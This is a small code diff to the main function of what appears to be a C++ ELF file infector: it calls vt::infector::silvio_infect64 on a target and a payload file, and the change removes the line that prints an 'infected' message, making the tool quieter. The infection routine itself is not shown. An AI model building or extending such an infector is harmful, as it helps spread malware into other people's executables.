@@ -8,7 +8,6 @@ int main(int argc, char** argv) {
   }
 
   if (vt::infector::silvio_infect64(argv[1], argv[2])) {
-    printf("infected %s\n", argv[1]);
     return EXIT_SUCCESS;
   }
   return EXIT_FAILURE;
